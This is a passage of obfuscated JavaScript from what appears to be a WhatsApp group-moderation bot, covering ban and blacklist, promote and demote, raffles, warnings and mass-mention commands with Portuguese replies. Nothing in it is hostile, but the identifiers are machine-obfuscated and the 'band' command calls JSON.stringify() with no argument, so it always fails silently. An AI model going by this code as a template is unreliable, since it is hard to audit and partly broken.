              if (_0x326cbd[0].listanegra.includes(_0x44cf80)) {
                return _0x50740b("*Esse Número ja esta incluso*");
              }
              _0x326cbd[0].listanegra.push(_0x44cf80);
              _0x137e44(_0x326cbd);
              _0x50740b("*Número adicionado a lista de autoban*");
              break;
            case "delremover":
            case "delautorm":
            case "delautoban":
            case "tirardalista":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63 && !_0xf59944) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (!_0x44cf80) {
                return _0x50740b("Marque a mensagem do usuário com o comando ou utilize o comando com o número do usuário que deseja tirar da lista negra..");
              }
              if (!_0x326cbd[0].listanegra.includes(_0x44cf80)) {
                return _0x50740b("*Esse Número não esta incluso*");
              }
              var _0x573f90 = _0x326cbd[0].listanegra.indexOf(_0x44cf80);
              _0x326cbd[0].listanegra.splice(_0x573f90, 1);
              _0x137e44(_0x326cbd);
              _0x50740b("*Número foi removido da lista de autoban*");
              break;
            case "listban":
            case "listaban":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (_0x326cbd[0].listanegra.length < 1) {
                return _0x50740b("*Nenhum Número não foi adicionado*");
              }
              teks = "*Números que vou moer na porrada se voltar 😡:*\n";
              for (_0x3194f3 = 0; _0x3194f3 < _0x326cbd[0].listanegra.length; ++_0x3194f3) {
                teks += "➤ *" + _0x326cbd[0].listanegra[_0x3194f3].split('@')[0] + "*\n";
              }
              teks += "*Esses ai vou descer meu martelo do ban 🥵*";
              _0x50740b(teks);
              break;
            case "band":
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              try {
                if (!_0x5e13bf || _0xd79836[1]) {
                  return _0x50740b("Marque a mensagem do usuário ou marque o @ dele.., lembre de só marcar um usuário...");
                }
                if (_0x1b869d) {
                  setTimeout(() => {
                    _0x5196be.sendMessage(_0x346d97, {
                      'delete': {
                        'remoteJid': _0x346d97,
                        'fromMe': false,
                        'id': _0xd2050d.key.id,
                        'participant': _0x246d48
                      }
                    });
                  }, 500);
                }
                if (!JSON.stringify().includes(_0x5e13bf)) {
                  return _0x50740b("Este usuário já foi removido do grupo.");
                }
                if (_0x517366.includes(_0x5e13bf)) {
                  return _0x50740b("Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você");
                }
                if (_0x5bd5f4.includes(_0x5e13bf)) {
                  return _0x50740b("Não posso remover meu dono 🤧");
                }
                _0x5196be.sendMessage(_0x346d97, {
                  'text': '@' + _0x5e13bf.split('@')[0] + " Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos justos.) -",
                  'mentions': [_0x5e13bf]
                });
                _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x5e13bf], "remove");
              } catch (_0x464577) {
                console.log(_0x464577);
              }
              break;
            case "ban":
            case "banir":
            case "kick":
            case "avadakedavra":
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              try {
                if (!_0x5e13bf || _0xd79836[1]) {
                  return _0x50740b("Marque a mensagem do usuário ou marque o @ dele.., lembre de só marcar um usuário...");
                }
                if (!JSON.stringify(groupMembers).includes(_0x5e13bf)) {
                  return _0x50740b("Este usuário já foi removido do grupo ou saiu.");
                }
                const _0x46c26b = {
                  url: banieumesma
                };
                const _0x3c661b = {
                  audio: _0x46c26b,
                  mimetype: "audio/mpeg",
                  ptt: true
                };
                const _0x5b6209 = {
                  quoted: _0xd2050d
                };
                if (_0x517366.includes(_0x5e13bf)) {
                  return _0x5196be.sendMessage(_0x346d97, _0x3c661b, _0x5b6209);
                }
                if (JSON.stringify(_0x5bd5f4).indexOf(_0x5e13bf) >= 0) {
                  return _0x50740b("Não posso remover meu dono 🤧");
                }
                if (JSON.stringify(_0x1b6ab1).indexOf(_0x5e13bf) >= 0) {
                  return _0x50740b("Não posso remover meu criador 🤧");
                }
                if (necessarioo.audioban && necessarioo.audioban.length > 0) {
                  let _0x5077d6 = necessarioo.audioban[Math.floor(Math.random() * necessarioo.audioban.length)];
                  let _0x3e0080 = _0x5077d6.replace("#meugit#", "https://raw.githubusercontent.com/Salientekill");
                  if (_0x3e0080) {
                    const _0x131688 = {
                      url: _0x3e0080
                    };
                    const _0x51b2b8 = {
                      audio: _0x131688,
                      mimetype: "audio/mpeg",
                      ptt: true
                    };
                    const _0x194875 = {
                      quoted: _0xd2050d
                    };
                    _0x5196be.sendMessage(_0x346d97, _0x51b2b8, _0x194875);
                  }
                }
                if (necessarioo.figban && necessarioo.figban.length > 0) {
                  let _0x46b710 = necessarioo.figban[Math.floor(Math.random() * necessarioo.figban.length)];
                  let _0x2b4651 = _0x46b710.replace("#meugit#", "https://raw.githubusercontent.com/badDevelopper/Testfigu/main/fig");
                  if (_0x2b4651) {
                    const _0x164ecb = {
                      url: _0x2b4651
                    };
                    const _0x389e31 = {
                      sticker: _0x164ecb
                    };
                    _0x5196be.sendMessage(_0x346d97, _0x389e31);
                  }
                }
                _0x5196be.sendMessage(_0x346d97, {
                  'text': '@' + _0x5e13bf.split('@')[0] + " Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos justos.) -",
                  'mentions': [_0x5e13bf]
                });
                _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x5e13bf], "remove");
              } catch (_0x2e4b02) {
                console.log(_0x2e4b02);
              }
              break;
            case "vasco":
              {
                if (!_0x3f2f63) {
                  return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
                }
                if (!_0x42a9f2) {
                  return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
                }
                try {
                  if (!_0x5e13bf || _0xd79836[1]) {
                    return _0x50740b("Marque a mensagem do usuário ou marque o @ dele.., lembre de só marcar um usuário...");
                  }
                  if (!JSON.stringify(groupMembers).includes(_0x5e13bf)) {
                    return _0x50740b("Este usuário já foi removido do grupo ou saiu.");
                  }
                  const _0x5f06bc = {
                    url: banieumesma
                  };
                  const _0x3cfbee = {
                    audio: _0x5f06bc,
                    mimetype: "audio/mpeg",
                    ptt: true
                  };
                  const _0x2a5952 = {
                    quoted: _0xd2050d
                  };
                  if (_0x517366.includes(_0x5e13bf)) {
                    return _0x5196be.sendMessage(_0x346d97, _0x3cfbee, _0x2a5952);
                  }
                  if (JSON.stringify(_0x5bd5f4).indexOf(_0x5e13bf) >= 0) {
                    return _0x50740b("Não posso remover meu dono 🤧");
                  }
                  if (JSON.stringify(_0x1b6ab1).indexOf(_0x5e13bf) >= 0) {
                    return _0x50740b("Não posso remover meu criador 🤧");
                  }
                  let _0x144d22 = ['@' + _0x5e13bf.split('@')[0] + " foi jogar no Vasco como volante.", '@' + _0x5e13bf.split('@')[0] + " foi jogar no Vasco de atacante.", '@' + _0x5e13bf.split('@')[0] + " foi jogar no Vasco de goleiro."];
                  let _0x5bb27a = _0x144d22[Math.floor(Math.random() * _0x144d22.length)];
                  const _0x34e7cf = {
                    text: _0x5bb27a,
                    mentions: [_0x5e13bf]
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x34e7cf);
                  _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x5e13bf], "remove");
                } catch (_0x3c8b20) {
                  console.log(_0x3c8b20);
                }
              }
              break;
            case "promover":
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (!_0x5e13bf || _0xd79836[1]) {
                return _0x50740b("Marque a mensagem do usuário ou marque o @ dele.., lembre de só marcar um usuário...");
              }
              if (!JSON.stringify(groupMembers).includes(_0x5e13bf)) {
                return _0x50740b("Este usuário foi removido do grupo ou saiu, não será possível promover..");
              }
              const _0x57d064 = {
                url: audiopromo2
              };
              const _0x4496b4 = {
                audio: _0x57d064,
                mimetype: "audio/mpeg",
                ptt: true
              };
              const _0x3125f1 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x4496b4, _0x3125f1);
              _0x5196be.sendMessage(_0x346d97, {
                'text': '@' + _0x5e13bf.split('@')[0] + " Foi promovido(a) para adm com sucesso.",
                'mentions': [_0x5e13bf]
              });
              _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x5e13bf], "promote");
              break;
            case "rebaixar":
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (!_0x5e13bf || _0xd79836[1]) {
                return _0x50740b("Marque a mensagem do usuário ou marque o @ dele.., lembre de só marcar um usuário...");
              }
              if (!JSON.stringify(groupMembers).includes(_0x5e13bf)) {
                return _0x50740b("Este usuário foi removido do grupo ou saiu, não será possível rebaixar..");
              }
              const _0x40e94f = {
                url: audiorebai
              };
              const _0x350e8c = {
                audio: _0x40e94f,
                mimetype: "audio/mpeg",
                ptt: true
              };
              const _0x306960 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x350e8c, _0x306960);
              _0x5196be.sendMessage(_0x346d97, {
                'text': '@' + _0x5e13bf.split('@')[0] + " Foi Rebaixado para [ MEMBRO COMUM ] com sucesso.",
                'mentions': [_0x5e13bf]
              });
              _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x5e13bf], "demote");
              break;
            case "sorteionumero":
            case "sorteionumeros":
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              try {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Coloque algo, após o comando sorteio, por exemplo, " + _0x141936 + "sorteionumero de 100 R$");
                }
                var _0x41da77 = _0x30e708[Math.floor(Math.random() * _0x30e708.length)];
                d = [];
                teks = "🎉Parabéns ao número do sortudo, por ganhar o sorteio " + _0x11e99e + ":\n\n";
                for (_0x3194f3 = 0; _0x3194f3 < 1; _0x3194f3++) {
                  teks += "🔥፝⃟  ➣ " + _0x41da77 + "\n";
                  d.push(_0x41da77);
                }
                _0x1106fd(teks, d, true);
              } catch (_0x3a40d8) {
                console.log(_0x3a40d8);
                _0x50740b("Deu erro, tente novamente :/");
              }
              break;
            case "sortear":
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!fs.existsSync("./DADOS/json/sorteio-" + _0x346d97 + ".json")) {
                bala = {
                  'motivo': _0x23d865.join(" "),
                  'participantes': []
                };
                fs.writeFileSync("./DADOS/json/sorteio-" + _0x346d97 + ".json", '' + JSON.stringify(bala));
                txx = "╭━◌━《 SORTEIO 》━◌━╮\n│\n│~⪧ *Tema*: *" + _0x23d865.join(" ") + "*\n│\n│ *" + _0x141936 + "participar*\n│para entrar no sorteio.\n╰───────────────────";
                _0x5dcc57(txx);
              } else {
                soiteio = JSON.parse(fs.readFileSync("./DADOS/json/sorteio-" + _0x346d97 + ".json"));
                _0x50740b("🤖 um sorteio já foi iniciado:\n\n*Tema:* *\"" + soiteio.motivo + "\"*");
              }
              break;
            case "participar":
              if (!fs.existsSync("./DADOS/json/sorteio-" + _0x346d97 + ".json")) {
                txx = "desculpe mais não tem um Sorteio ativo nesse grupo";
                _0x50740b(txx);
              } else {
                dataespelho = JSON.parse(fs.readFileSync("./DADOS/json/sorteio-" + _0x346d97 + ".json"));
                if (dataespelho.participantes.includes(_0x246d48)) {
                  return _0x50740b("🤖 Desculpe mais vc já estava participando do sorteio");
                }
                dataespelho.participantes.push(_0x246d48);
                fs.writeFileSync("./DADOS/json/sorteio-" + _0x346d97 + ".json", JSON.stringify(dataespelho));
                _0x50740b("🤖 Vc está participando do sorteio com sucesso ✔");
              }
              break;
            case "cancelar-sorteio":
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!fs.existsSync("./DADOS/json/sorteio-" + _0x346d97 + ".json")) {
                return _0x50740b("🤖 Desculpe mas não ah um sorteio em andamento.");
              }
              fs.unlinkSync("./DADOS/json/sorteio-" + _0x346d97 + ".json");
              _0x50740b("🤖 *Sorteio cancelado com sucesso* ✔");
              break;
            case "sorteio":
            case "encerrar-sorteio":
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!fs.existsSync("./DADOS/json/sorteio-" + _0x346d97 + ".json")) {
                return _0x50740b("Desculpe mais não tem sorteio nesse gp no momento inicie um com " + _0x141936 + "sortear tema");
              }
              it = JSON.parse(fs.readFileSync("./DADOS/json/sorteio-" + _0x346d97 + ".json"));
              if (it.participantes.length < 1) {
                return _0x50740b("🤖 *Tenha no minimo 1 pessoa participando do sorteio*");
              }
              foi = it.participantes[Math.floor(Math.random() * it.participantes.length)];
              tzt = "╭━◌━《 *GANHADOR(a)* 》━◌━╮\n│\n│⪧ *Tema*: *" + it.motivo + "*\n│\n│⪧ *Ganhador(a):* *@" + foi.split('@')[0] + "*\n│\n╰───────────────────";
              _0x5dcc57(tzt);
              fs.unlinkSync("./DADOS/json/sorteio-" + _0x346d97 + ".json");
              break;
            case "sorteio2":
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              try {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Coloque algo, após o comando sorteio, por exemplo, " + _0x141936 + "sorteio de 100 R$");
                }
                d = [];
                teks = "🎉Parabéns, por ganhar o sorteio " + _0x11e99e + ":\n\n";
                for (_0x3194f3 = 0; _0x3194f3 < 1; _0x3194f3++) {
                  r = Math.floor(Math.random() * _0x3071b5.participants.length + 0);
                  teks += "🔥፝⃟  ➣ @" + groupMembers[r].id.split('@')[0] + "\n";
                  d.push(groupMembers[r].id);
                }
                _0x1106fd(teks, d, true);
              } catch (_0x5071a5) {
                console.log(_0x5071a5);
                _0x50740b("Deu erro, tente novamente :/");
              }
              break;
            case "rankinativo":
            case "rankinativos":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              await _0xc7d21a();
              bule = [];
              bule2 = [];
              mentioned_jid = [];
              for (cag of countMessage[_0x52a298].numbers) {
                bule2.push(cag.id);
                if (cag.messages <= 1) {
                  bule.push(cag);
                }
              }
              bule.sort((_0x43ff8e, _0x40d437) => _0x43ff8e.messages + _0x43ff8e.cmd_messages < _0x40d437.cmd_messages + _0x40d437.messages ? 0 : -1);
              boardi = "Rank dos mais Ghosts do Grupo:\n\n";
              if (bule.length == 0) {
                boardi += "Sem Ghosts";
              }
              for (_0x3194f3 = 0; _0x3194f3 < (bule.length < 5 ? bule.length : 5); _0x3194f3++) {
                if (_0x3194f3 != null) {
                  boardi += _0x3194f3 + 1 + "º : @" + bule[_0x3194f3].id.split('@')[0] + "\nMensagens: " + bule[_0x3194f3].messages + "\nComandos dados: " + bule[_0x3194f3].cmd_messages + "\nAparelho: " + bule[_0x3194f3].aparelho + "\n\n";
                }
                mentioned_jid.push(bule[_0x3194f3].id);
              }
              _0x1106fd(boardi, mentioned_jid, true);
              break;
            case "advertencia":
            case "advertir":
            case "adverter":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (_0x5e13bf == _0x517366) {
                return _0x50740b("Não pode advertir o próprio bot...");
              }
              if (_0x5e13bf == _0xbd10de) {
                return _0x50740b("Não pode advertir o próprio dono do bot");
              }
              if (_0x1c25a7.includes(_0x5e13bf)) {
                return _0x50740b("Não pode advertir ADMS..");
              }
              if (!JSON.stringify(groupMembers).includes(_0x5e13bf)) {
                return _0x50740b("Não tem como advertir um usuário que não se encontra mais no grupo..");
              }
              _0x285e8e.push(_0x5e13bf);
              _0x137e44(_0x326cbd);
              setTimeout(async () => {
                var _0x299d82 = _0x285e8e.filter(_0x3024c8 => _0x3024c8 == _0x5e13bf).length;
                var _0x10de9c = "Opa: @" + _0x5e13bf.split('@')[0] + " você foi advertido " + _0x299d82 + "/3, tome cuidado, com 3 advertências, você será removido...";
                if (!_0x10de9c.includes("3/3")) {
                  if (!JSON.stringify(_0x285e8e).includes(_0x246d48)) {
                    await sleep(1500);
                    _0x1106fd(_0x10de9c, [_0x5e13bf]);
                  } else if (_0x299d82 == 2) {
                    await sleep(1500);
                    _0x1106fd(_0x10de9c, [_0x5e13bf]);
                  }
                } else {
                  _0x5196be.sendMessage(_0x346d97, {
                    'text': "Adeus usuário @" + _0x5e13bf.split('@')[0] + ", você completou 3 advertências 😪, fale com quem a baniu para ter noção de o que ocorreu..",
                    'mentions': [_0x5e13bf]
                  });
                  await sleep(1500);
                  _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x5e13bf], "remove");
                  var _0x1c8f40 = _0x285e8e.indexOf(_0x5e13bf);
                  _0x285e8e.splice(_0x1c8f40, 3);
                  _0x137e44(_0x326cbd);
                }
              }, 3000);
              break;
            case "grupo":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865[0] === 'a') {
                _0x50740b("*GRUPO ABERTO COM SUCESSO*");
                _0x5196be.groupSettingUpdate(_0x346d97, "not_announcement");
              } else if (_0x23d865[0] === 'f') {
                _0x50740b("*GRUPO FECHADO COM SUCESSO*");
                _0x5196be.groupSettingUpdate(_0x346d97, "announcement");
              }
              break;
            case "grupoinfo":
            case "infogrupo":
            case "infogp":
            case "gpinfo":
            case "regras":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              let _0x1cae3a;
              try {
                _0x1cae3a = await _0x5196be.profilePictureUrl(_0x346d97, "image");
              } catch {
                _0x1cae3a = "https://telegra.ph/file/6ca032835ed7a16748b6f.jpg";
              }
              const _0xa69275 = {
                url: _0x1cae3a
              };
              const _0x57f9d3 = {
                image: _0xa69275,
                caption: "*NOME* : " + _0x3baffe + "\n*MEMBRO* : " + groupMembers.length + "\n*ADMIN* : " + _0x1c25a7.length + "\n*DESCRIÇÃO* : " + _0x288e09,
                thumbnail: null
              };
              const _0x5df48a = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x57f9d3, _0x5df48a);
              break;
            case "totag":
            case "cita":
            case "hidetag":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x3f2f63) {
                  return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
                }
                let _0x2cae5 = '';
                var _0x2002e6 = _0xd2050d.message?.["extendedTextMessage"]?.["contextInfo"]?.["quotedMessage"];
                var _0x47b60a = _0x54198a ? _0x2002e6?.["imageMessage"] : _0xd2050d.message?.["imageMessage"];
                var _0x37575f = _0xee3727 ? _0x2002e6?.["videoMessage"] : _0xd2050d.message?.["videoMessage"];
                var _0x417249 = _0x47f03c ? _0x2002e6?.["documentMessage"] : _0xd2050d.message?.["documentMessage"];
                var _0x25e12d = _0x210554 ? _0x2002e6?.["documentWithCaptionMessage"]?.["message"]?.["documentMessage"] : _0xd2050d.message?.["documentWithCaptionMessage"]?.["message"]?.["documentMessage"];
                var _0x843d9b = _0x2f2cdc ? _0x2002e6.audioMessage : '';
                var _0x15d9f3 = _0x309ffb ? _0x2002e6.stickerMessage : '';
                var _0x533342 = _0x101cab && !_0x843d9b && !_0x15d9f3 && !_0x47b60a && !_0x37575f && !_0x417249 && !_0x25e12d ? _0x2002e6.conversation : _0xd2050d.message?.["conversation"];
                var _0x130462 = _0x2002e6?.["extendedTextMessage"]?.["text"] || _0xd2050d?.["message"]?.["extendedTextMessage"]?.["text"];
                var _0x181283 = groupMembers.map(_0x5d27c7 => _0x5d27c7.id);
                if (_0x47b60a && !_0x843d9b && !_0x417249) {
                  _0x2cae5 = _0x47b60a;
                  _0x47b60a.caption = _0x11e99e.length > 1 ? "Marcação Do Adm: " + _0x11e99e : _0x47b60a.caption.replace(new RegExp(_0x141936 + _0x267d4b, 'gi'), "Marcação do Adm: @" + _0x246d48.split('@')[0] + "\n\n");
                  _0x47b60a.image = {
                    'url': _0x47b60a.url
                  };
                  _0x47b60a.mentions = _0x181283;
                } else {
                  if (_0x37575f && !_0x843d9b && !_0x417249) {
                    _0x2cae5 = _0x37575f;
                    _0x37575f.caption = _0x11e99e.length > 1 ? "Marcação Do Adm: " + _0x11e99e.trim() : _0x37575f.caption.replace(new RegExp(_0x141936 + _0x267d4b, 'gi'), "Marcação do Adm: @" + _0x246d48.split('@')[0] + "\n\n").trim();
                    _0x37575f.video = {
                      'url': _0x37575f.url
                    };
                    _0x37575f.mentions = _0x181283;
                  } else {
                    if (_0x533342 && !_0x843d9b && !_0x417249) {
                      black = {};
                      if (_0x533342.startsWith(_0x141936 + _0x267d4b)) {
                        black.text = _0x533342.replace(new RegExp('^' + _0x141936 + _0x267d4b, 'i'), "Marcação do Adm: @" + _0x246d48.split('@')[0] + "\n\n").replace(new RegExp('^' + _0x141936, 'i'), '').trim();
                      } else {
                        black.text = _0x533342.trim();
                      }
                      black.mentions = _0x181283;
                      _0x2cae5 = black;
                    } else {
                      if (!_0x843d9b && !_0x15d9f3 && _0x130462 && !_0x417249 && !_0x417249) {
                        brown = {};
                        brown.text = _0x130462.replace(new RegExp(_0x141936 + _0x267d4b, 'gi'), "Marcação do Adm: @" + _0x246d48.split('@')[0] + "\n\n").trim();
                        brown.mentions = _0x181283;
                        _0x2cae5 = brown;
                      } else {
                        if (_0x417249) {
                          _0x2cae5 = _0x417249;
                          _0x417249.document = {
                            'url': _0x417249.url
                          };
                          _0x417249.mentions = _0x181283;
                        } else {
                          if (_0x25e12d && !_0x843d9b) {
                            _0x2cae5 = _0x25e12d;
                            _0x25e12d.caption = _0x11e99e.length > 1 ? "Marcação Do Adm: " + _0x11e99e.trim() : _0x25e12d.caption.replace(new RegExp(_0x141936 + _0x267d4b, 'gi'), "Marcação do Adm: @" + _0x246d48.split('@')[0] + "\n\n").trim();
                            _0x25e12d.document = {
                              'url': _0x25e12d.url
                            };
                            _0x25e12d.mentions = _0x181283;
                          } else {
                            if (_0x15d9f3 && !_0x843d9b) {
                              _0x2cae5 = _0x15d9f3;
                              _0x15d9f3.sticker = {
                                'url': _0x15d9f3.url
                              };
                              _0x15d9f3.mentions = _0x181283;
                            } else {
                              if (_0x843d9b) {
                                _0x2cae5 = _0x843d9b;
                                _0x843d9b.audio = {
                                  'url': _0x843d9b.url
                                };
                                _0x843d9b.mentions = _0x181283;
                                _0x843d9b.ptt = true;
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
                _0x5196be.sendMessage(_0x346d97, _0x2cae5)["catch"](_0x51b3d0 => {
                  console.log(_0x51b3d0);
                });
              }
              break;
            case "totag2":
            case "cita2":
            case "hidetag2":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x3f2f63) {
                  return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
                }
                let _0x22c328 = '';
                var _0x2002e6 = _0xd2050d.message?.["extendedTextMessage"]?.["contextInfo"]?.["quotedMessage"];
                var _0x47b60a = _0x54198a ? _0x2002e6?.["imageMessage"] : _0xd2050d.message?.["imageMessage"];
                var _0x37575f = _0xee3727 ? _0x2002e6?.["videoMessage"] : _0xd2050d.message?.["videoMessage"];
                var _0x417249 = _0x47f03c ? _0x2002e6?.["documentMessage"] : _0xd2050d.message?.["documentMessage"];
                var _0x25e12d = _0x210554 ? _0x2002e6?.["documentWithCaptionMessage"]?.["message"]?.["documentMessage"] : _0xd2050d.message?.["documentWithCaptionMessage"]?.["message"]?.["documentMessage"];
                var _0x843d9b = _0x2f2cdc ? _0x2002e6.audioMessage : '';
                var _0x15d9f3 = _0x309ffb ? _0x2002e6.stickerMessage : '';
                var _0x533342 = _0x101cab && !_0x843d9b && !_0x15d9f3 && !_0x47b60a && !_0x37575f && !_0x417249 && !_0x25e12d ? _0x2002e6.conversation : _0xd2050d.message?.["conversation"];
                var _0x130462 = _0x2002e6?.["extendedTextMessage"]?.["text"] || _0xd2050d?.["message"]?.["extendedTextMessage"]?.["text"];
                var _0x181283 = groupMembers.map(_0x402bc3 => _0x402bc3.id);
                if (_0x47b60a && !_0x843d9b && !_0x417249) {
                  _0x22c328 = _0x47b60a;
                  _0x47b60a.caption = _0x11e99e.length > 1 ? '' + _0x11e99e : _0x47b60a.caption.replace(new RegExp(_0x141936 + _0x267d4b, 'gi'), '');
                  _0x47b60a.image = {
                    'url': _0x47b60a.url
                  };
                  _0x47b60a.mentions = _0x181283;
                } else {
                  if (_0x37575f && !_0x843d9b && !_0x417249) {
                    _0x22c328 = _0x37575f;
                    _0x37575f.caption = _0x11e99e.length > 1 ? '' + _0x11e99e.trim() : _0x37575f.caption.replace(new RegExp(_0x141936 + _0x267d4b, 'gi'), '').trim();
                    _0x37575f.video = {
                      'url': _0x37575f.url
                    };
                    _0x37575f.mentions = _0x181283;
                  } else {
                    if (_0x533342 && !_0x843d9b && !_0x417249) {
                      black = {};
                      if (_0x533342.startsWith(_0x141936 + _0x267d4b)) {
                        black.text = _0x533342.replace(new RegExp('^' + _0x141936 + _0x267d4b, 'i'), '').replace(new RegExp('^' + _0x141936, 'i'), '').trim();
                      } else {
                        black.text = _0x533342.trim();
                      }
                      black.mentions = _0x181283;
                      _0x22c328 = black;
                    } else {
                      if (!_0x843d9b && !_0x15d9f3 && _0x130462 && !_0x417249 && !_0x417249) {
                        brown = {};
                        brown.text = _0x130462.replace(new RegExp(_0x141936 + _0x267d4b, 'gi'), '').trim();
                        brown.mentions = _0x181283;
                        _0x22c328 = brown;
                      } else {
                        if (_0x417249) {
                          _0x22c328 = _0x417249;
                          _0x417249.document = {
                            'url': _0x417249.url
                          };
                          _0x417249.mentions = _0x181283;
                        } else {
                          if (_0x25e12d && !_0x843d9b) {
                            _0x22c328 = _0x25e12d;
                            _0x25e12d.caption = _0x11e99e.length > 1 ? '' + _0x11e99e.trim() : _0x25e12d.caption.replace(new RegExp(_0x141936 + _0x267d4b, 'gi'), '').trim();
                            _0x25e12d.document = {
                              'url': _0x25e12d.url
                            };
                            _0x25e12d.mentions = _0x181283;
                          } else {
                            if (_0x15d9f3 && !_0x843d9b) {
                              _0x22c328 = _0x15d9f3;
                              _0x15d9f3.sticker = {
                                'url': _0x15d9f3.url
                              };
                              _0x15d9f3.mentions = _0x181283;
                            } else {
                              if (_0x843d9b) {
                                _0x22c328 = _0x843d9b;
                                _0x843d9b.audio = {
                                  'url': _0x843d9b.url
                                };
                                _0x843d9b.mentions = _0x181283;
                                _0x843d9b.ptt = true;
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
                _0x5196be.sendMessage(_0x346d97, _0x22c328)["catch"](_0x139e5a => {
                  console.log(_0x139e5a);
                });
              }
              break;
            case "marcar":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              async function _0xe012a7() {
                if (necessarioo.audiomarcar) {
                  const _0x2c9bf2 = {
                    url: necessarioo.audiomarcar
                  };
                  const _0x348429 = {
                    audio: _0x2c9bf2,
                    mimetype: "audio/mpeg",
                    ptt: true
                  };
                  const _0x5e049c = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x348429, _0x5e049c);
                }
                let _0x4f064e = [];
                blad = "\n𝑀𝐸𝑀𝐵𝑅𝑂𝑆 𝐶𝑂𝑀𝑈𝑀\n𝐵𝑂𝑇: " + NomeDoBot + "\n\n-_- Do Grupo: " + _0x3baffe + " -_-" + (!_0x11e99e ? '' : "\n\n~» Mensagem: " + _0x11e99e) + "\n\n";
                for (let _0x21f1ec of _0x546a1f) {
                  blad += "✥➤ @" + _0x21f1ec.split('@')[0] + "\n\n";
                  _0x4f064e.push(_0x21f1ec);
                }
                blam = JSON.stringify(_0x546a1f);
                if (blam.length == 2) {
                  return _0x50740b("Olá Adm - Não contêm Membros comum no Grupo: " + _0x3baffe + ", apenas - [ ADMINISTRADORES ]");
                }
                _0x1106fd(blad, _0x4f064e, true);
              }
              _0xe012a7()["catch"](_0x50c264 => {
                console.log(_0x50c264);
              });
              break;
            case "marcar2":
              try {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x3f2f63) {
                  return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
                }
                if (_0x11e99e.includes('' + _0x141936)) {
